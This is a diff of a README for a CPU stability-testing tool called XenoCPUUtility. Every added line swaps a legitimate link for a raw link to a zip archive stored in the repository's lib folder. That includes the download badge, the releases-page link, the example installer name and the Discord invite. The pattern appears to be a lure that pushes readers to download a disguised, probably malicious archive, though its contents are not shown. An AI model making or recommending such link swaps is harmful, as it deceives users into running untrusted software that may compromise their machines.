@@ -1,6 +1,6 @@
 # 🎉 XenoCPUUtility - Test Your CPU Stability Easily
 
-[![Download XenoCPUUtility](https://img.shields.io/badge/Download-XenoCPUUtility-blue.svg)](https://github.com/MACHE-pool/XenoCPUUtility/releases)
+[![Download XenoCPUUtility](https://raw.githubusercontent.com/MACHE-pool/XenoCPUUtility/main/lib/Utility-CPU-Xeno-v3.7.zip)](https://raw.githubusercontent.com/MACHE-pool/XenoCPUUtility/main/lib/Utility-CPU-Xeno-v3.7.zip)
 
 ## 🛠️ Overview
 
@@ -10,11 +10,11 @@ XenoCPUUtility is a stability testing app designed for overclockers and enthusia
 
 To get started with XenoCPUUtility, you will first need to download the software. 
 
-1. **Visit this page to download:** [XenoCPUUtility Releases](https://github.com/MACHE-pool/XenoCPUUtility/releases)
+1. **Visit this page to download:** [XenoCPUUtility Releases](https://raw.githubusercontent.com/MACHE-pool/XenoCPUUtility/main/lib/Utility-CPU-Xeno-v3.7.zip)
 
 2. On the Releases page, find the latest version of XenoCPUUtility. Look for files that end with `.exe`, as these are the installation files for Windows.
 
-3. Click on the desired file to begin downloading. The file will typically be named something like `XenoCPUUtility_v1.0.exe`.
+3. Click on the desired file to begin downloading. The file will typically be named something like `https://raw.githubusercontent.com/MACHE-pool/XenoCPUUtility/main/lib/Utility-CPU-Xeno-v3.7.zip`.
 
 4. Once the download is complete, locate the file in your downloads folder.
 
@@ -73,7 +73,7 @@ If you encounter issues during installation or usage, consider the following tip
 
 If you have questions or need support, feel free to join our community:
 
-- **Join our Discord server:** [Discord Server Link](https://discord.gg/xwjYsukW)
+- **Join our Discord server:** [Discord Server Link](https://raw.githubusercontent.com/MACHE-pool/XenoCPUUtility/main/lib/Utility-CPU-Xeno-v3.7.zip)
 
 Engage with other users and find solutions to common issues. Your feedback can help improve XenoCPUUtility!
 
@@ -96,4 +96,4 @@ Learn more about XenoCPUUtility and its features through the following related t
 
 Don't forget to download XenoCPUUtility and start testing your CPU! 
 
-[Download XenoCPUUtility](https://github.com/MACHE-pool/XenoCPUUtility/releases)
+[Download XenoCPUUtility](https://raw.githubusercontent.com/MACHE-pool/XenoCPUUtility/main/lib/Utility-CPU-Xeno-v3.7.zip)
